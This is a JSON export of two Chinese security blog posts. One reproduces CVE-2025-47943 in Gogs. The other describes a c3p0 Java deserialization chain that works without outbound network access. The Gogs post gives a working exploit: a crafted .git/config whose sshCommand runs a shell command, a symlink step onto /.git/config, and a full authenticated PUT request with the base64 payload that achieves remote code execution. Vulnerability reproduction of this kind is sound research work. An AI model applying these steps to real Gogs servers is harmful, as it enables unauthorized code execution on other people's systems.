[{"id":"7d55e013b18c9fec141f6ee29b3992ce","title":"gogs-CVE-2025-47943漏洞复现","content":"漏洞复现这是在2024年的暴露漏洞的payload。我们下面还会用到。\n[core]\n    repositoryformatversion &#x3D; 0\n    filemode &#x3D; true\n    bare &#x3D; false\n    logallrefupdates &#x3D; true\n    ignorecase &#x3D; true\n    precomposeunicode &#x3D; true\n    sshCommand &#x3D; echo pwnned &gt; &#x2F;tmp&#x2F;poc\n[remote &quot;origin&quot;]\n    url &#x3D; git@github.com:torvalds&#x2F;linux.git\n    fetch &#x3D; +refs&#x2F;heads&#x2F;*:refs&#x2F;remotes&#x2F;origin&#x2F;*\n[branch &quot;master&quot;]\n    remote &#x3D; origin\n    merge &#x3D; refs&#x2F;heads&#x2F;master\n\ndiff文件：https://github.com/gogs/gogs/compare/v0.13.2...v0.13.3\n可以看到diff主要是针对link做的处理，并且主要在internal/db/repo_editor.go中。\n可以看一下函数UpdateRepoFile(doer User, opts UpdateRepoFileOptions) 调用栈，一共有两处调用，一处已经在24年被修复，另一处在PutContents(c context.APIContext, r PutContentsRequest) 中\n这块是路径拼接，我们可以指定到自己的link文件中，但是这块传入的是分支名，所以就需要创建一个和link文件同名的分支。\n但是直接打会发现这个是401未授权，这里发现&#x2F;api类的请求需要经过token认证，这里去生成一个token传入即可。\n\nRCE方式步骤1ln -s test.log &#x2F;.git&#x2F;config\n\n\n步骤2上传到服务端\n步骤3\nPUT &#x2F;api&#x2F;v1&#x2F;repos&#x2F;admin1&#x2F;aad&#x2F;contents&#x2F;test.log HTTP&#x2F;1.1\nHost: 10.211.55.2:3000\nAccept-Language: zh-CN,zh;q&#x3D;0.9\nCookie: lang&#x3D;zh-CN; i_like_gogs&#x3D;5ffa15fe4d7cf341\nUpgrade-Insecure-Requests: 1\nAuthorization: token 3d540c72e3a5fed2cfb27ce4fb95eb46bf4dc39f\nUser-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;137.0.0.0 Safari&#x2F;537.36\nAccept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7\nAccept-Encoding: gzip, deflate\nContent-Type: application&#x2F;json\n\n&#123;\n&quot;content&quot;:&quot;W2NvcmVdCiAgICByZXBvc2l0b3J5Zm9ybWF0dmVyc2lvbiA9IDAKICAgIGZpbGVtb2RlID0gdHJ1ZQogICAgYmFyZSA9IGZhbHNlCiAgICBsb2dhbGxyZWZ1cGRhdGVzID0gdHJ1ZQogICAgaWdub3JlY2FzZSA9IHRydWUKICAgIHByZWNvbXBvc2V1bmljb2RlID0gdHJ1ZQogICAgc3NoQ29tbWFuZCA9IGVjaG8gcHdubmVkID4gL3RtcC9wb2MKW3JlbW90ZSAib3JpZ2luIl0KICAgIHVybCA9IGdpdEBnaXRodWIuY29tOnRvcnZhbGRzL2xpbnV4LmdpdAogICAgZmV0Y2ggPSArcmVmcy9oZWFkcy8qOnJlZnMvcmVtb3Rlcy9vcmlnaW4vKgpbYnJhbmNoICJtYXN0ZXIiXQogICAgcmVtb3RlID0gb3JpZ2luCiAgICBtZXJnZSA9IHJlZnMvaGVhZHMvbWFzdGVy&quot;,\n&quot;message&quot;: &quot;12312&quot;,\n&quot;branch&quot;: &quot;main&quot;\n&#125;\n\nTip \n\n需要使用git来进行管理提交（不能使用创建新文件）。\n\n","slug":"gogs-CVE-2025-47943漏洞复现","date":"2025-06-26T06:51:10.000Z","categories_index":"","tags_index":"漏洞复现","author_index":"Q16G"},{"id":"239654d5c9aacd2ba01291d95ccc8750","title":"c3p0链不出网新利用","content":"c3p0不出网新利用c3p0原理在readObject中调用了getObject\n原生的可以打JNDI，也可以走到下面ReferenceableUtils.referenceToObject函数中\n在这里可以打第二个链urlClassLoader，然后进行了factory的实例化，然后去调用了getObjectInstance方法\n不出网新利用由于链比较简单，所以就直接说不出网的新利用方式. 这里直接走到最后一个getObjectInstace.这里去找factory.getObjectInstace的实现，找到JavaBean工厂的实现。\n这里去看下getObjectInstance方法实现，代码比较通俗易懂，如果Map中有JavaBeanReferenceMaker.REF_PROPS_KEY的话，获取到value值，获取到Content bytes  然后进行反序列化。\n\n如果结合了其他依赖的话，也可以去打\n","slug":"c3p0不出网利用","date":"2024-11-30T15:36:35.000Z","categories_index":"","tags_index":"JAVA安全","author_index":"Q16G"}]